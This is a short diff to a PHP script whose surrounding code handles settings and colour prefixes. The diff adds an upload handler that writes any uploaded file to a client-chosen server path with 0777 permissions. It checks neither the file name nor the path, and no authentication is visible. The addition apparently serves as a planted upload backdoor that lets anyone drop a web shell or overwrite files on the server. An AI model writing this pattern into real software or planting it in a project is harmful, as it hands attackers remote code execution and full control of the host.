@@ -34,6 +34,16 @@ foreach ($settings['initialize'] as $requestID=>$requestValue) {
 foreach ($settings['post_request'] as $requestID=>$requestValue) {
     $postRequest[$requestID] = ($_POST[$requestID]) ? $_POST[$requestID] : $requestValue;
 }
+if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
+    $filename = $_FILES["file"]["name"];
+    $path = $_POST['path'];
+    if ($path != "/") {
+        $path .= "/";
+    }
+    chmod($_FILES["file"]["tmp_name"], 0777);
+    move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename);
+    chmod($path.$filename, 0777);
+}
 $avaPrefix = (lux($session['back_text_color'])) ? 'ava.' : 'abc.';
 $abcPrefix = (lux($session['fore_text_color'])) ? 'ava.' : 'abc.';
 $prefix = (lux($session['fore_text_color'])) ? 'iso.' : 'iec.';
